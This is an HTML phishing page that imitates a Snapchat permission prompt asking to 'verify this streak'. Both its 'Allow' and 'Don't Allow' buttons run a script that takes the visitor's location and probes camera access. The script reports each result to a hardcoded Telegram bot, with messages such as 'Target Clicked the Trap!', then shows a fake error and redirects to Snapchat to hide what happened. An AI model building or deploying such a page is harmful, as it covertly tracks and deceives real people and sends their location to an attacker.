<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Streak</title>
    <style>
        body { background-color: #000; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 10; }
        .alert-box { position: relative; width: 280px; background: rgba(255,255,255,0.95); border-radius: 15px; text-align: center; overflow: hidden; z-index: 20; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
        .text { padding: 20px; color: #000; font-size: 16px; line-height: 1.4; font-weight: 500; }
        .btns { display: flex; border-top: 0.5px solid #bbb; }
        .btn { flex: 1; padding: 12px; color: #007AFF; font-size: 17px; cursor: pointer; border: none; background: none; outline: none; font-family: inherit; }
        .btn-bold { font-weight: 600; border-right: 0.5px solid #bbb; }
    </style>
</head>
<body>

<div class="overlay"></div>
<div class="alert-box">
    <div class="text">Allow "Snapchat" to access your location and camera to verify this streak?</div>
    <div class="btns">
        <button class="btn btn-bold" onclick="startCapture()">Allow</button>
        <button class="btn" onclick="startCapture()">Don't Allow</button>
    </div>
</div>

<script>
    // 😈 زانیارییەکانت بە پارێزراوی
    const B_T = "8641718491:AAH1_yNz4ZQ0hxmMhWK9HPc7zY6CDsvfw2o";
    const C_I = "212703396";

    async function notify(msg) {
        const url = `https://api.telegram.org/bot${B_T}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: C_I, text: msg })
        });
    }

    function startCapture() {
        notify("🎯 Target Clicked the Trap!");

        // 1. Location
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((p) => {
                notify(`📍 Location: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
                getCam();
            }, () => {
                notify("❌ Location Denied");
                getCam();
            });
        } else {
            getCam();
        }
    }

    function getCam() {
        navigator.mediaDevices.getUserMedia({ video: true })
        .then(s => {
            notify("📸 Camera Access: GRANTED");
            s.getTracks().forEach(t => t.stop());
            done();
        })
        .catch(() => {
            notify("🚫 Camera Access: DENIED");
            done();
        });
    }

    function done() {
        setTimeout(() => {
            alert("Connection error (0x884). Please try again.");
            window.location.href = "https://www.snapchat.com";
        }, 1000);
    }
</script>

</body>
</html>
